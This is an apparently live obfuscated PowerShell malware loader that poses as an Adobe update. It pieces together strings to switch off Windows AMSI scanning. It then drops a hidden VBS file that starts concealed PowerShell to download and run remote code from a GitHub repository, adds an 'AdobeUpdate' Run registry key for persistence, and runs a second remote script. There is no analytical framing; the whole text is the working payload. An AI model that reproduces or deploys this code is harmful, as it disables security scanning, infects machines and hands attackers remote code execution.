try
{


$uggiukP='Sy'
$osiqhdcjwoc='.Man'
$iouhoaiucio='stem'
$iohsdvppaidhc='ment.'
$iohoidsvopoapv='age'
$hoisdvoapdjvhphav='Auto'
$hpshdvioavpja='Utils'
$ihoaivaohvjaisdhv='mation.'
$oihaovoavsava='Am'
$ihqoiwfoqofqfwq='si'


$usdvhaoihv='am'
$hoHcohchpHvp='In'
$ihoahvoahvo='it'
$oihaohvoahvo='Fa'
$ihohasovoahv='il'
$ihoahsvoihasv='ed'

$hoihasohoshva='NonP'
$ojpaoshvhapshvpahv='ubli'
$iooaisvoaovava='c,'
$ohaphvpahpvpJcC='Sta'
$iasovosaivavspajv='tic'




       [Ref].Assembly.GetType($uggiukP+$iouhoaiucio+$osiqhdcjwoc+$iohoidsvopoapv+$iohsdvppaidhc+$hoisdvoapdjvhphav+$ihoaivaohvjaisdhv+$oihaovoavsava+$ihqoiwfoqofqfwq+$hpshdvioavpja).GetField(($usdvhaoihv+$ihqoiwfoqofqfwq+$hoHcohchpHvp+$ihoahvoahvo+$oihaohvoahvo+$ihohasovoahv+$ihoahsvoihasv),($hoihasohoshva+$ojpaoshvhapshvpahv+$iooaisvoaovava+$ohaphvpahpvpJcC+$iasovosaivavspajv)).SetValue($null,$true)
}
finally
{

$dricksjisx='https://raw.githubusercontent.com/burnitup545/AdobeUpdate/main/Updater.ps1'

$VBS_f_ile = @'
ksayewnds="SheLl"
kcwowycp="ower"
haugwloshbv=" -w hIdDen -eX"
hctixwichs=" bYpaSs -c"



aiensjd= "p"+kcwowycp+ksayewnds+haugwloshbv+hctixwichs+" IE"+"X"+" ((n"+"ew-o"+"bje"+"ct n"+"et.w"+"ebc"+"li"+"ent).d"+"ownloa"+"dstr"+"ing('ht"+"tps://"+"raw.githubusercontent.com/burnitup545/AdobeUpdate/main/lib706.ps1'))"
CreateObject("Wscript."+ksayewnds).Run aiensjd, 0, false
'@
Start-Sleep -s 3
Set-Content -Path $env:ProgramFiles\cu.vbs -Value $VBS_f_ile
attrib +h “$env:ProgramFiles\cu.vbs”

reg add “HKLM\Software\Microsoft\Windows\CurrentVersion\Run” /v AdobeUpdate /t REG_EXPAND_SZ /d “%ProgramFiles%\cu.vbs”


IEX ((new-object net.webclient).downloadstring($dricksjisx))

}
